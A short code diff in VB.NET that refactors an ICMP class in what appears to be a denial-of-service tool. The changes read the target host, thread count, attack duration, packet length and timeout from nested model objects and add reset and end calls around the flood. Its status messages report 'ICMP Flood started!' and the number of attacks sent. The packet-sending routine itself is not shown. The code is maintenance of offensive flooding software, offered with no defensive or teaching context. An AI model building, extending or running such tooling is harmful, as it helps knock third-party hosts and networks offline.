@@ -15,13 +15,14 @@ Public Class ICMP
     Public Sub New(ByVal model As ICMPModel)
         If Not AttackRunning = True Then
             AttackRunning = True
-            HostToAttack = model.Host
-            ThreadstoUse = model.ThreadstoUse
-            TimetoAttack = model.Time
-            Threadsto = model.ThreadstoUse
-            Length = model.Length
-            Timeout = model.Timeout
+            HostToAttack = model.newBaseFloodModel.Host
+            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
+            TimetoAttack = model.newBaseFloodModel.Time
+            Threadsto = model.newBaseFloodModel.ThreadstoUse
+            Length = model.newIcmpVariables.Length
+            Timeout = model.newIcmpVariables.Timeout
             Threads = New Thread(Threadsto - 1) {}
+            GetFloodsBase().Reset()
             GetFloodsBase().SetMessage("ICMP Flood started!")
             For i As Integer = 0 To Threadsto - 1
                 Threads(i) = New Thread(AddressOf DoWork)
@@ -41,7 +42,7 @@ Public Class ICMP
             AttackRunning = False
             GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
-
+            GetFloodsBase().SetEnd()
         End If
     End Sub
 
